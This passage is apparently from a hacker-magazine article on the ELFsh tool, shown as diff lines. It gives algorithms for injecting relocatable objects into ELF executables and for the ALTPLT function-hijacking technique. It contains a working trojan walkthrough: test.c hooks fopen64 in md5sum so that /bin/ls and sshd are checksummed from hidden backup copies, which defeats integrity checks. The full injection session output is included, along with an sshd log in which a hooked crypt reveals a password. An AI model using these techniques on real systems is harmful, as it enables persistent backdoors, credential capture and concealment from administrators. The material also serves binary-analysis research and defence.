+Server listening on 0.0.0.0 port 22.
+debug1: Server will not fork when running in debugging mode.
+Connection from 127.0.0.1 port 40619
+debug1: Client protocol version 2.0; client software version OpenSSH_3.5p1
+debug1: match: OpenSSH_3.5p1 pat ^OpenSSH
+Enabling compatibility mode for protocol 2.0
+debug1: Local version string SSH-2.0-OpenSSH_3.0.2p1
+debug1: Rhosts Authentication disabled, originating port 40619 not trusted
+debug1: list_hostkey_types: ssh-rsa,ssh-dss
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: client->server aes128-cbc hmac-md5 none
+debug1: kex: server->client aes128-cbc hmac-md5 none
+debug1: SSH2_MSG_KEX_DH_GEX_REQUEST received
+debug1: SSH2_MSG_KEX_DH_GEX_GROUP sent
+debug1: dh_gen_key: priv key bits set: 127/256
+debug1: bits set: 1597/3191
+debug1: expecting SSH2_MSG_KEX_DH_GEX_INIT
+debug1: bits set: 1613/3191
+debug1: SSH2_MSG_KEX_DH_GEX_REPLY sent
+debug1: kex_derive_keys
+debug1: newkeys: mode 1
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: waiting for SSH2_MSG_NEWKEYS
+debug1: newkeys: mode 0
+debug1: SSH2_MSG_NEWKEYS received
+debug1: KEX done
+debug1: userauth-request for user mayhem service ssh-connection method \
+none
+debug1: attempt 0 failures 0
+Failed none for mayhem from 127.0.0.1 port 40619 ssh2
+debug1: userauth-request for user mayhem service ssh-connection method \
+publickey
+debug1: attempt 1 failures 1
+debug1: test whether pkalg/pkblob are acceptable
+debug1: temporarily_use_uid: 1000/31337 (e=0)
+debug1: trying public key file /home/mayhem/.ssh/authorized_keys
+debug1: matching key found: file /home/mayhem/.ssh/authorized_keys, line 1
+debug1: restore_uid
+Postponed publickey for mayhem from 127.0.0.1 port 40619 ssh2
+debug1: userauth-request for user mayhem service ssh-connection method \
+keyboard-interactive
+debug1: attempt 2 failures 1
+debug1: keyboard-interactive devs 
+debug1: auth2_challenge: user=mayhem devs=
+debug1: kbdint_alloc: devices ''
+Failed keyboard-interactive for mayhem from 127.0.0.1 port 40619 ssh2
+debug1: userauth-request for user mayhem service ssh-connection method \
+password
+debug1: attempt 3 failures 2
+.:: crypt redirected -key- = mytestpasswd (42 .::. 2) 
+ $
+
+	
+	Fine. If you want extreme details on the implementation, please
+	read the ELFsh code, particulary libelfsh/relinject.c. For the
+	academic audience, the pseudo-code algorithms are provided.
+	Because ET_REL injection is based on BSS and Symbol table fusion, 
+	section pre-interp injection, section post-bss injection, 
+	SHT shifting, SHT entry insertion, symbol injection, and section
+	data injection, all those algorithms are also available. The BSS
+	physical insertion is performed only once, at the first use of
+	post-bss injection. The general algorithm for ET_REL injection is
+	as follow:
+
+
+ 1/ Fuse ET_REL and ET_EXEC .bss sections
+ 2/ Find and inject ET_REL allocatable sections into ET_EXEC
+ 3/ Synchronize ET_EXEC symbol table (inject missing ET_REL symbols)
+ 4/ Relocate each injected section if its .rel(a) table is available
+
+ 
+	Now let's give some details ;)
+
+	
+--------[ .:: MAIN ALGORITHM : ET_REL injection into ET_EXEC ::.
+
+       
+       1/ Insert ET_REL object .bss into ET_EXEC (see BSS fusion algo)
+
+       2/ FOREACH section in ET_REL object
+          [
+	     IF section is a/ allocatable (sh_flags & SHF_ALLOC)
+			   b/ non-null sized (sh_size != 0)
+			   c/ data-typed (sh_type == SHT_PROGBITS)
+	     [
+
+		IF section is writable -or- OS is FreeBSD
+		[
+		  - Inject post-bss section into ET_EXEC
+		]
+		ELSE
+		[
+		  - Inject pre-interp section into ET_EXEC
+		]
+	     ]
+          ]
+
+       3/ Insert ET_REL .symtab into ET_EXEC (symtab fusion algorithm)
+
+       4/ FOREACH section in ET_REL object
+       [
+	  IF a/ section has been injected in 2. (same conditions)
+	     b/ section needs relocation (.rel.sctname is found in ET_REL)
+	  [
+	      - Relocate the section
+	  ]
+       ]
+
+
+--------[ BSS fusion algorithm
+
+
+       - Insert ET_EXEC BSS physically if not already done (see next algo)
+       FOREACH symbol from the ET_REL object
+       [
+	  IF symbol points into the BSS (st_shndx & SHN_COMMON)
+	  [
+	     WHILE ET_EXEC .bss size is not aligned (sh_size % st_value)
+             [
+	       - Increment by 1 the .bss size field (sh_size)
+	     ]
+	     - Insert symbol w/ st_value = .bss sh_addr + .bss sh_size
+	     - Add symbol size to ET_EXEC .bss size (sh_size)
+	  ]
+       ]
+
+
+---------[ BSS physical insertion algorithm 
+
+
+	 FOREACH PHT entry
+	 [
+		IF a/ segment is loadable (p_type == PT_LOAD) 
+		   b/ segment is writable (p_flags & PF_W)
+		[
+		  - Put p_memsz value into p_filesz
+		  - End of algorithm
+		]	
+	 ]
+
+
+--------[ Symbol Tables fusion algorithm
+
+
+       FOREACH symbol in ET_REL object
+       [
+          IF Symbol type is function (STT_FUNC) or variable (STT_OBJECT)
+	  [
+	     - Get parent section for this symbol using st_shndx field
+	     IF Parent section has been injected in 2. (same conditions)
+	     [
+	        - Add section's base address to the symbol value
+		- Inject new symbol into ET_EXEC
+	     ]
+          ]
+       ]
+
+
+--------[ Section pre-interp injection algorithm
+
+	- Compute section size congruent with page size
+	- Create new section's header
+	- Inject section header (see SHT header insertion algorithm)
+	FOREACH PHT entry
+	[
+	   IF a/ segment type is loadable (p_type == PT_LOAD)
+	      b/ segment is executable (p_flags & PF_X)
+	   [
+	      - Add section's size to p_filesz and p_memsz
+	      - Substract section's size from p_vaddr and p_paddr
+	   ]
+	   ELSE IF segment type is PT_PHDR
+	   [
+              - Substract section's size from p_vaddr and p_paddr
+	   ]
+	   ELSE
+	   [
+	      - Add section's size to p_offset
+	   ]
+       ]
+       - Shift SHT (see algorithm below)
+
+
+---------[ Section post-bss injection algorithm
+
+
+	- Create new section's header 
+	- Inject section header (see SHT header insertion algorithm)
+	FOREACH PHT entry
+	[
+	   IF a/ segment is loadable (p_type == PT_LOAD)
+	      b/ segment is writable (p_flags & PF_W)
+	   [
+	      - Add section's size to p_memsz and p_filesz
+	      - End of algorithm
+	   ]	
+	]
+	- Shift SHT by the section size (see next algorithm)
+
+
+---------[ SHT shifting algorithm
+
+
+	FOREACH SHT entry
+	[
+	   IF current linked section (sh_link) points after new section
+	   [
+	      - Increment by 1 the sh_link field
+	   ]
+	   IF current file offset > injected section file offset
+	   [
+	      - Add injected section sh_size to current sh_offset
+	   ]
+	]
+
+
+---------[ SHT header insertion algorithm
+
+	   
+	- Insert new section's name into .shstrtab
+	- Insert new entry in SHT at requested range
+	- Increment by 1 the e_shnum field in ELF header
+	FOREACH SHT entry
+	[
+	   IF current entry file offset is after SHT file offset
+	   [
+	      - Add e_shentsize from ELF header to current sh_offset
+	   ]
+	]
+	IF injected section header sh_offset <= SHT file offset
+	[
+	  - Add new section size (sh_size) to e_shoff field in ELF header
+	]
+	IF requested new section range <= section string table index
+	[
+	   - Increment sh_strndx field in ELF header
+	]
+
+
+---------[ Symbol injection algorithm
+
+
+	- Insert symbol name into .strtab section
+	- Insert symbol entry into .symtab section
+
+
+---------[ Section data injection algorithm (apply to all type of section)
+	  
+
+	- Insert data into section
+	- Add injected data size to section's sh_size
+	IF SHT file offset > section file offset
+	[
+	  - Add injected data size to e_shoff in ELF header
+	]
+	FOREACH SHT entry
+	[
+	   IF current entry sh_offset field > extended section file offset
+	   [
+	      IF current entry sh_addr field is non-null
+	      [
+	         - Add injected data size to sh_addr
+	      ]
+	      - Add injected data size to sh_offset
+	   ]
+	]
+	IF extended section sh_addr is non-null
+	[
+	   FOREACH symbol table entry
+	   [
+	      IF symbol points after extended section former upper bound
+	      [
+		 - Add injected data size to st_value field
+	      ]
+	   ]
+	]
+
+
+     The relocation (step 4) algorithm wont be detailed, because it is
+     already all explained in the ELF reference. In short, the relocation 
+     process consists in updating all the addresses references in the 
+     injected ET_REL code, using the available merged symbol tables in 
+     the ET_EXEC file. There are 12 relocation types on INTEL and 56 
+     relocations types on SPARC, however, only 2 types are mostly used on
+     INTEL, and only 3 on SPARC for ET_REL objects.
+
+     This last stage is a switch/case based algorithm, which has in
+     charge to update some bytes, many times, in each injected mapped
+     section. The relocation tables contains all the information necessary
+     for this operation, their name is .rel.<target> (or .rela.<target> on
+     SPARC), with <target> beeing the section which is going to be 
+     relocated using this table). Those sections can be easily found just
+     parsing the SHT and looking for sections whoose st_type is SHT_REL 
+     (or SHT_RELA on SPARC).
+
+     What makes the ELFsh relocation engine powerful, is the using of both
+     symbol table (.symtab and .dynsym), which means that the injected 
+     code can resolve symbols from the executable itself, e.g. it is 
+     possible to call the core functions of the executable, as well 
+     as existing .plt entries from the backdoor code, if their symbol 
+     value is available. For more details about the relocation step, 
+     please look at the ELFsh code in libelfsh/relinject.c, particulary 
+     at the elfsh_relocate_i386 and and elfsh_relocate_sparc.
+
+     As suggested in the previous paragraph, ELFsh has a limitation since
+     it is not possible to call functions not already present in the 
+     binary. If we want to call such functions, we would have to add 
+     information for the dynamic linker, so that the function address can
+     be resolved in runtime using the standard GOT/PLT mechanism. It 
+     would requires .got, .plt, .rel.plt, .dynsym, .dynstr, and .hash
+     extensions, which is not trivial when we dont want to move the 
+     binary data and code zones from their original addresses. 
+
+     Since relocation information is not available for ET_EXEC ELF 
+     objects, we woulnt be sure that our reconstructed relocation 
+     information would be 100% exact, without having a very strong and 
+     powerful dataflow analysis engine. This was proved by modremap 
+     (modules/modremap.c) written by spacewalkr, which is a 
+     SHT/PHT/symtab shifter. Coupled to the ELFsh relocation finder 
+     (vm/findrel.c), this module can remap a ET_EXEC binary in another 
+     place of the address space. This is known to work for /bin/ls and 
+     various /bin/* but bigger binaries like ssh/sshd cannot be relocated
+     using this technique, because valid pointers double words are not
+     always real pointers in such bins (false positives happen in hash
+     values).
+
+     For this reason, we dont want to move ET_EXEC section's from their
+     original place. Instead, it is probably possible to add extra 
+     sections and use big offsets from the absolute addresses stored
+     into .dynamic, but this feature is not yet provided. A careful 
+     choice of external functions hijacking is usually enough to get rid
+     of the non-present symbol problem, even if this 'extra-function 
+     resolving' feature will probably be implemented in the future. For
+     some sections like .hash, it may be necessary to do a copy of the
+     original section after .bss and change the referenced address in
+     the .dynamic section, so that we can extend the hash without moving
+     any original code or data.
+
+
+-------[ 4. Infection : ALTPLT technique
+
+
+     Now that we have a decent residency technique in ET_REL injection,
+     let's focus on a new better infection technique than GOT redirection
+     and PLT infection : the ALTPLT technique. This new technique takes
+     advantage of the symbol based function address resolving of the
+     previous technique, as detailed below.
+
+     ALTPLT is an improvement of PLT infection technique. Silvio Cesare
+     describes how to modify the .plt section, in order to redirect
+     function calls to library onto another code, so called the hook
+     code. From [4], the algorithm of original .plt infection:
+
+
+     -----%<-------%<--------%<---------%<----------%<--------%<---------
+
+     '' The algorithm at the entry point code is as follows...
+
+     * mark the text segment writable
+     * save the PLT(GOT) entry
+     * replace the PLT(GOT) entry with the address of the new libcall
+
+     The algorithm in the new library call is as follows...
+
+     * do the payload of the new libcall
+     * restore the original PLT(GOT) entry
+     * call the libcall
+     * save the PLT(GOT) entry again (if it is changed)
+     * replace the PLT(GOT) entry with the address of the new libcall ''
+
+     -----%<-------%<--------%<---------%<----------%<--------%<---------
+
+     The implementation of such an algorithm was presented in x86
+     assembly language using segment padding residency. This technique
+     is not enough because:
+
+	 1/ It is architecture dependant
+	 2/ Strict segments rights may not be kept consistant (PaX unsafe)
+	 3/ The general layout of the technique lacks a formal interface
+	 
+     The new ALTPLT technique consists of copying the Procedure Linkage
+     Table (.plt) to an alternative section, called .orig.plt, using a 
+     pre-interp injection, so that it resides in the read-only code
+     segment. For each entry of the .orig.plt, we create and inject a
+     new reference symbol, which name the same as the .plt entry symbol
+     at the same index, except that it starts by 'old_'.
+
+     Using this layout, we are able to perform standard PLT infection on
+     the original .plt section, but instead of having a complex
+     architecture dependant hook code, we use an injected function
+     residing in hook.o.text, which is the text section of an ET_REL
+     module that was injected using the technique described in the	
+     previous part of the paper. 
+
+     This way, we can still call the original function using
+     old_funcname(), since the injected symbol will be available for
+     the relocation engine, as described in the ET_REL injection
+     algorithm ;).
+
+     We keep the GOT/PLT mechanism intact and we rely on it to provide
+     a normal function address resolution, like in every dynamic
+     executable files. The .got section will now be unique for both .plt 
+     and .orig.plt sections. The added section .orig.plt is a strict copy
+     of the original .plt, and will not ever be overwritten. In other
+     words, .orig.plt is PaX safe. The only difference will be that 
+     original .plt entries may not use .got, but might be redirected on
+     another routine using a direct branchement instruction.
+
+     Let's look at an example where the puts() function is hijacked, and
+     the puts_troj() function is called instead.
+
+
+     On INTEL:
+
+
+ -----BEGIN EXAMPLE 13-----
+ old_puts + 0   jmp  *<_GLOBAL_OFFSET_TABLE_ + 20>      FF 25 00 97 04 08 
+ old_puts + 6   push          $10                       68 10 00 00 00 
+ old_puts + 11  jmp           <old_dlresolve>           E9 C0 FF FF FF 
+
+ puts + 0       jmp           <puts_troj>               E9 47 ED FF FF 
+ puts + 5       or            %ch,10(%eax)              08 68 10 
+ puts + 8       add           %al,(%eax)                00 00 
+ puts + 10      add           %ch,%cl                   00 E9 
+ puts + 12      sar           $FF,%bh                   C0 FF FF 
+ puts + 15      (bad)         %edi                      FF FF 
+ -----END EXAMPLE 13-----
+
+
+     On SPARC:
+
+
+ -----BEGIN EXAMPLE 14-----
+ old_puts + 0   sethi  %hi(0xf000), %g1			03 00 00 3c     
+ old_puts + 4   b,a   e0f4 <func2+0x1e0c>		30 bf ff f0     
+ old_puts + 8   nop					01 00 00 00     
+
+ puts + 0	jmp  %g1 + 0xf4 ! <puts_troj>		81 c0 60 f4     
+ puts + 4	nop					01 00 00 00     
+ puts + 8	sethi  %hi(0x12000), %g1		03 00 00 48     
+ -----END EXAMPLE 14-----
+
+      
+    This is the only architecture dependant operation in the ALTPLT 
+    algorithm. It means that this feature can be implemented very easily
+    for other processors as well. However, on SPARC there is one more
+    modification to do on the first entry of the .orig.plt section.
+    Indeed, the SPARC architecture does not use a Global Offset Table 
+    (.got) for function address resolving, instead the .plt section is 
+    directly modified at dynamic linking time. Except for this
+    difference, the SPARC .plt works just the same as INTEL .plt (both 
+    are using the first .plt entry each time, as explained in the ELF 
+    reference).
+
+    For this reason, we have to modify the first .orig.plt entry to make
+    it point on the first .plt entry (which is patched in runtime before 
+    the main() function takes control). In order to patch it, we need to
+    use a register other than %g1 (since this one is used by the dynamic 
+    linker to identify the .plt entry which has to be patched), for 
+    example %g2 (elfsh_hijack_plt_sparc_g2 in libelfsh/hijack.c).
+
+    Patched first .orig.plt entry on SPARC:
+
+      
+ -----BEGIN EXAMPLE 15-----
+ .orig.plt	 sethi  %hi(0x20400), %g2		05 00 00 81
+ .orig.plt	 jmp    %g2 + 0x2a8  ! <.plt>		81 c0 a2 a8
+ .orig.plt	 nop					01 00 00 00
+ -----END EXAMPLE 15-----
+
+
+    The reason for NOP instructions after the branching instruction
+    (jmp) is because of SPARC delay slot. In short, SPARC branchement
+    is done in such way that it changes the NPC register (New Program
+    Counter) and not the PC register, and the instruction after a
+    branching one is executed before the real branchement. 
+
+    Let's use a new example which combines ET_REL injection and ALTPLT
+    infection this time (instead of GOT redirection, like in the previous
+    sshd example). We will modify md5sum so that access to /bin/ls and
+    /usr/sbin/sshd is redirected. In that case, we need to hijack the
+    fopen64() function used by md5sum, swap the real path with the
+    backup path if necessary, and call the original fopen64 as if
+    nothing had happened:
+
+
+ -----BEGIN EXAMPLE 16-----
+ $ cat md16.esh
+ #!/usr/bin/elfsh
+ 
+ load /usr/bin/md5sum
+ load test.o
+ 
+ # Add test.o into md5sum
+ reladd 1 2
+
+ # Redirect fopen64 to fopen64_troj (in test.o) using ALTPLT technique
+ redir fopen64 fopen64_troj
+
+ save md5sum.new
+ quit
+ $ chmod +x md16.esh
+ $ 
+ -----END EXAMPLE 16-----
+
+
+	  Let's look at the injected code. Because the strcmp() libc
+	  function is not used by md5sum and therefore its symbol is not
+	  available in the binary, we have to copy it in the module
+	  source:
+
+
+ -----BEGIN EXAMPLE 17-----
+ $ cat test.c
+ #include <stdlib.h>
+
+ #define HIDDEN_DIR      "/path/to/hidden/dir"
+ #define LS              "/bin/ls"
+ #define SSHD            "/usr/sbin/sshd"
+ #define LS_BAQ          "ls.baq"
+ #define SSHD_BAQ        "sshd.baq"
+
+ int     mystrcmp(char *str1, char *str2)
+ {
+   u_int cnt;
+
+   for (cnt = 0; str1[cnt] && str2[cnt]; cnt++)
+     if (str1[cnt] != str2[cnt])
+       return (str1[cnt] - str2[cnt]);
+   return (str1[cnt] - str2[cnt]);
+ }
+
+ int     fopen64_troj(char *str1, char *str2)
+ {
+   if (!mystrcmp(str1, LS))
+     str1 = HIDDEN_DIR "/" LS_BAQ;
+   else if (!mystrcmp(str1, SSHD))
+     str1 = HIDDEN_DIR "/" SSHD_BAQ;
+   return (old_fopen64(str1, str2));
+ }
+ $ gcc test.c -c 
+ $ 
+ -----END EXAMPLE 17-----
+
+
+	  For this last example, the full relinking information
+	  will be printed on stdout, so that the reader can enjoy
+	  all the details of the implementation:
+
+
+ -----BEGIN EXAMPLE 18-----
+ $ 
+
+  Welcome to The ELF shell 0.5b9 .::.
+
+  .::. This software is under the General Public License
+  .::. Please visit http://www.gnu.org to know about Free Software
+
+~load /usr/bin/md5sum
+ [*] New object /usr/bin/md5sum loaded on Sat Aug  2 16:16:32 2003
+
+~exec cc test.c -c
+ [*] Command executed successfully
+
+~load test.o
+ [*] New object test.o loaded on Sat Aug  2 16:16:32 2003
+
+~reladd 1 2
+[DEBUG_RELADD] Found BSS zone lenght [00000000] for module [test.o]
+[DEBUG_RELADD] Inserted STT_SECT symbol test.o.text       [080470F4]
+[DEBUG_RELADD] Inserted STT_SECT symbol test.o.rodata     [080460F4]
+[DEBUG_RELADD] Inserted STT_SECT symbol .orig.plt         [080450F4]
+[DEBUG_RELADD] Injected symbol old_dlresolve              [080450F4]
+[DEBUG_RELADD] Injected symbol old_ferror                 [08045104]
+[DEBUG_COPYPLT] Symbol at .plt + 16 injected succesfully
+[DEBUG_RELADD] Injected symbol old_strchr                 [08045114]
+[DEBUG_COPYPLT] Symbol at .plt + 32 injected succesfully
+[DEBUG_RELADD] Injected symbol old_feof                   [08045124]
+[DEBUG_COPYPLT] Symbol at .plt + 48 injected succesfully
+[DEBUG_RELADD] Injected symbol old___register_frame_info  [08045134]
+[DEBUG_COPYPLT] Symbol at .plt + 64 injected succesfully
+[DEBUG_RELADD] Injected symbol old___getdelim             [08045144]
+[DEBUG_COPYPLT] Symbol at .plt + 80 injected succesfully
+[DEBUG_RELADD] Injected symbol old_fprintf                [08045154]
+[DEBUG_COPYPLT] Symbol at .plt + 96 injected succesfully
+[DEBUG_RELADD] Injected symbol old_fflush                 [08045164]
+[DEBUG_COPYPLT] Symbol at .plt + 112 injected succesfully
+[DEBUG_RELADD] Injected symbol old_dcgettext              [08045174]
+[DEBUG_COPYPLT] Symbol at .plt + 128 injected succesfully
+[DEBUG_RELADD] Injected symbol old_setlocale              [08045184]
+[DEBUG_COPYPLT] Symbol at .plt + 144 injected succesfully
+[DEBUG_RELADD] Injected symbol old___errno_location       [08045194]
+[DEBUG_COPYPLT] Symbol at .plt + 160 injected succesfully
+[DEBUG_RELADD] Injected symbol old_puts                   [080451A4]
+[DEBUG_COPYPLT] Symbol at .plt + 176 injected succesfully
+[DEBUG_RELADD] Injected symbol old_malloc                 [080451B4]
+[DEBUG_COPYPLT] Symbol at .plt + 192 injected succesfully
+[DEBUG_RELADD] Injected symbol old_fread                  [080451C4]
+[DEBUG_COPYPLT] Symbol at .plt + 208 injected succesfully
+[DEBUG_RELADD] Injected symbol old___deregister_frame_info [080451D4]
+[DEBUG_COPYPLT] Symbol at .plt + 224 injected succesfully
+[DEBUG_RELADD] Injected symbol old_bindtextdomain         [080451E4]
+[DEBUG_COPYPLT] Symbol at .plt + 240 injected succesfully
+[DEBUG_RELADD] Injected symbol old_fputs                  [080451F4]
+[DEBUG_COPYPLT] Symbol at .plt + 256 injected succesfully
+[DEBUG_RELADD] Injected symbol old___libc_start_main      [08045204]
+[DEBUG_COPYPLT] Symbol at .plt + 272 injected succesfully
+[DEBUG_RELADD] Injected symbol old_realloc                [08045214]
+[DEBUG_COPYPLT] Symbol at .plt + 288 injected succesfully
+[DEBUG_RELADD] Injected symbol old_textdomain             [08045224]
+[DEBUG_COPYPLT] Symbol at .plt + 304 injected succesfully
+[DEBUG_RELADD] Injected symbol old_printf                 [08045234]
+[DEBUG_COPYPLT] Symbol at .plt + 320 injected succesfully
+[DEBUG_RELADD] Injected symbol old_memcpy                 [08045244]
+[DEBUG_COPYPLT] Symbol at .plt + 336 injected succesfully
+[DEBUG_RELADD] Injected symbol old_fclose                 [08045254]
+[DEBUG_COPYPLT] Symbol at .plt + 352 injected succesfully
+[DEBUG_RELADD] Injected symbol old_getopt_long            [08045264]
+[DEBUG_COPYPLT] Symbol at .plt + 368 injected succesfully
+[DEBUG_RELADD] Injected symbol old_fopen64                [08045274]
+[DEBUG_COPYPLT] Symbol at .plt + 384 injected succesfully
+[DEBUG_RELADD] Injected symbol old_exit                   [08045284]
+[DEBUG_COPYPLT] Symbol at .plt + 400 injected succesfully
+[DEBUG_RELADD] Injected symbol old_calloc                 [08045294]
+[DEBUG_COPYPLT] Symbol at .plt + 416 injected succesfully
+[DEBUG_RELADD] Injected symbol old__IO_putc               [080452A4]
+[DEBUG_COPYPLT] Symbol at .plt + 432 injected succesfully
+[DEBUG_RELADD] Injected symbol old_free                   [080452B4]
+[DEBUG_COPYPLT] Symbol at .plt + 448 injected succesfully
+[DEBUG_RELADD] Injected symbol old_error                  [080452C4]
+[DEBUG_COPYPLT] Symbol at .plt + 464 injected succesfully
+[DEBUG_RELADD] Entering intermediate symbol injection loop
+[DEBUG_RELADD] Injected ET_REL symbol mystrcmp            [080470F4]
+[DEBUG_RELADD] Injected symbol mystrcmp                   [080470F4]
+[DEBUG_RELADD] Injected ET_REL symbol fopen64_troj        [08047188]
+[DEBUG_RELADD] Injected symbol fopen64_troj               [08047188]
+[DEBUG_RELADD] Entering final relocation loop
+[DEBUG_RELADD] Relocate using section test.o.rodata  base [-> 080460F4]
+[DEBUG_RELADD] Relocate using section test.o.text    base [-> 080470F4]
+[DEBUG_RELADD] Relocate using section test.o.rodata  base [-> 080460FC]
+[DEBUG_RELADD] Relocate using section test.o.rodata  base [-> 08046117]
+[DEBUG_RELADD] Relocate using section test.o.text    base [-> 080470F4]
+[DEBUG_RELADD] Relocate using section test.o.rodata  base [-> 08046126]
+[DEBUG_RELADD] Relocate using existing symbol old_fopen64 [08045274]
+ [*] ET_REL test.o injected succesfully in ET_EXEC /usr/bin/md5sum
+
+~redir fopen64 fopen64_troj
+ [*] Function fopen64 redirected to addr 0x08047188 <fopen64_troj>
+
+~save md5sum.new
+ [*] Object md5sum.new save successfully
+
+~quit
+ [*] Unloading object 1 (test.o)
+ [*] Unloading object 2 (/usr/bin/md5sum) *
+
+         Good bye ! .::. The ELF shell 0.5b9
+ $ 
+ -----END EXAMPLE 18-----
+
+	  
+	  As shown in the script output, the new file has got new
+	  symbols (the old symbols). Let's observe them using the
+	  elfsh '-sym' command and the regex capability ('old') :
+
+
+ -----BEGIN EXAMPLE 19-----
+ $ elfsh -q -f md5sum.new -sym old
+ [SYMBOL TABLE]
+ [Object md5sum.new]
+
+ [27] 0x80450f4  FUNC old_dlresolve                sz:16 scop:Local 
+ [28] 0x8045104  FUNC old_ferror                   sz:16 scop:Local 
+ [29] 0x8045114  FUNC old_strchr                   sz:16 scop:Local 
+ [30] 0x8045124  FUNC old_feof                     sz:16 scop:Local 
+ [31] 0x8045134  FUNC old___register_frame_info    sz:16 scop:Local 
+ [32] 0x8045144  FUNC old___getdelim               sz:16 scop:Local 
+ [33] 0x8045154  FUNC old_fprintf                  sz:16 scop:Local 
+ [34] 0x8045164  FUNC old_fflush                   sz:16 scop:Local 
+ [35] 0x8045174  FUNC old_dcgettext                sz:16 scop:Local 
+ [36] 0x8045184  FUNC old_setlocale                sz:16 scop:Local 
+ [37] 0x8045194  FUNC old___errno_location         sz:16 scop:Local 
+ [38] 0x80451a4  FUNC old_puts                     sz:16 scop:Local 
+ [39] 0x80451b4  FUNC old_malloc                   sz:16 scop:Local 
+ [40] 0x80451c4  FUNC old_fread                    sz:16 scop:Local 
+ [41] 0x80451d4  FUNC old___deregister_frame_info  sz:16 scop:Local 
+ [42] 0x80451e4  FUNC old_bindtextdomain           sz:16 scop:Local 
+ [43] 0x80451f4  FUNC old_fputs                    sz:16 scop:Local 
+ [44] 0x8045204  FUNC old___libc_start_main        sz:16 scop:Local 
+ [45] 0x8045214  FUNC old_realloc                  sz:16 scop:Local 
+ [46] 0x8045224  FUNC old_textdomain               sz:16 scop:Local 
+ [47] 0x8045234  FUNC old_printf                   sz:16 scop:Local 
+ [48] 0x8045244  FUNC old_memcpy                   sz:16 scop:Local 
+ [49] 0x8045254  FUNC old_fclose                   sz:16 scop:Local 
+ [50] 0x8045264  FUNC old_getopt_long              sz:16 scop:Local 
+ [51] 0x8045274  FUNC old_fopen64                  sz:16 scop:Local 
+ [52] 0x8045284  FUNC old_exit                     sz:16 scop:Local 
+ [53] 0x8045294  FUNC old_calloc                   sz:16 scop:Local 
+ [54] 0x80452a4  FUNC old__IO_putc                 sz:16 scop:Local 
+ [55] 0x80452b4  FUNC old_free                     sz:16 scop:Local 
+ [56] 0x80452c4  FUNC old_error                    sz:16 scop:Local 
+ $ 
+ -----END EXAMPLE 19-----
+
+
+	  It sounds good ! Does it work now?
+
+	 
+
+   $ md5sum /bin/bash
+   ebe1f822a4d026c366c8b6294d828c87  /bin/bash
+   $ ./md5sum.new /bin/bash
+   ebe1f822a4d026c366c8b6294d828c87  /bin/bash
+
+   $ md5sum /bin/ls 
+   3b622e661f6f5c79376c73223ebd7f4d  /bin/ls
+   $ ./md5sum.new /bin/ls 
+   ./md5sum.new: /bin/ls: No such file or directory
+
+   $ md5sum /usr/sbin/sshd 
+   720784b7c1e5f3418710c7c5ebb0286c  /usr/sbin/sshd
+   $ ./md5sum.new /usr/sbin/sshd 
+   ./md5sum.new: /usr/sbin/sshd: No such file or directory
+
+   $ ./md5sum.new ./md5sum.new   
+   b52b87802b7571c1ebbb10657cedb1f6  ./md5sum.new
+   $ ./md5sum.new /usr/bin/md5sum 
+   8beca981a42308c680e9669166068176  /usr/bin/md5sum
+   $ 
+
+
+   Heheh. It work so well that even if you forget to put the original
+   copy in your hidden directory, md5sum prints the original path and
+   not your hidden directory path ;). This is because we only change a
+   local pointer in the fopen64_troj() function, and the caller function
+   is not aware of the modification, so the caller error message is
+   proceeded with the original path.
+ 
+   Let's give the detailed algorithm for the ALTPLT technique. It must
+   be used as a '2 bis' step in the main ET_REL injection algorithm
+   given in the previous chapter, so that injected code can use any
+   old_* symbols:
+
+    
+    - Create new section header with same size, type, rights as .plt
+    - Insert new section header
+    IF current OS == FreeBSD
+    [
+       - Inject section using post-bss technique.
+    ]
+    ELSE
+    [
+       - Inject section using pre-interp technique.
+    ]
+    FOREACH .plt entry (while counter < sh_size)
+    [
+      IF counter == 0 AND current architecture is SPARC
+      [
+        - Infect current entry using %g2 register.
+      ]
+      - Inject new 'old_<name>' symbol pointing on current entry 
+        (= sh_addr + cnt)
+      - Add PLT entry size in bytes (SPARC: 12, INTEL: 16) to cnt 
+    ]
+
+
+    This algorithm is executed once and only once per ET_EXEC file. The
+    'redir' command actually performs the PLT infection on demand. A
+    future (better) version of this command would allow core binary
+    function hijacking. Since the code segment is read-only in userland,
+    we cant modify the first bytes of the function at runtime and perform
+    some awful bytes restoration [13] [14] for calling back the original
+    function. The best solution is probably to build full control flow 
+    graphs for the target architecture, and redirect all calls to a given 
+    block (e.g. the first block of the hijacked function), making all 
+    these calls point to the hook function, as suggested in [15] . ELFsh 
+    provides INTEL control flow graphs (see modflow/modgraph), so does 
+    objobf [16], but the feature is not yet available for other
+    architectures, and some specific indirect branchement instructions
+    are not easily predictable [17] using static analysis only, so it
+    remains in the TODO.
+
+
+-------[ 5. The end ?
+
+
+    This is the end, beautiful friend. This is the end, my only friend,
+    the end... Of course, there is a lot of place for improvements and new
+    features in this area. More target architectures are planed (pa-risc,
+    alpha, ppc?), as well as more ELF objects support (version tables,
+    ELF64) and extension for the script langage with simple data and
+    control flow support. The ELF development is made easy using the
+    libelfsh API and the script engine. Users are invited to improve the
+    framework and all comments are really welcomed.
+
+
+-------[ 6. Greets
+
+
+    Greets go to #!dh and #dnerds peoples, you know who you are. Special
+    thanks to duncan @ mygale and zorgon for beeing cool-asses and giving
+    precious feedback. 
+
+    Other thanks, in random order : Silvio Cesare for his great work on
+    the first generation ELF techniques (I definitely learnt a lot from
+    you), all the ELFsh betatesters & contributors (y0 kil3r and thegrugq)
+    who greatly helped to provide reliable and portable software, pipash for
+    finding all the 76 char lenght lines of the article (your feedback
+    r00lz as usual ;) , grsecurity.net (STBWH) for providing a useful
+    sparc/linux account, and Shaun Clowes for giving good hints. 
+
+    Last minut big thanks to the M1ck3y M0us3 H4ck1ng Squ4dr0n and all the
+    peoples at Chaos Communication Camp 2003 (hi Bulba ;) for the great
+    time I had with them during those days, you guyz rock.
+
+
+-------[ 7. References
+
+
+  [1] The ELF shell project				The ELF shell crew
+  MAIN   : elfsh.devhell.org
+  MIRROR : elfsh.segfault.net
+
+  [2] PaX project					The PaX team
+  pageexec.virtualave.net
+
+  [3] ELF TIS reference	          
+  x86.ddj.com/ftp/manuals/tools/elf.pdf
+  www.sparc.com/standards/psABI3rd.pdf (SPARC supplement)
+
+  [4] UNIX ELF parasites and virus			silvio
+  www.u-e-b-i.com/silvio/elf-pv.txt
+
+  [5] Shared library redirection by ELF PLT infection	silvio
+  phrack.org/phrack/56/p56-0x07
+
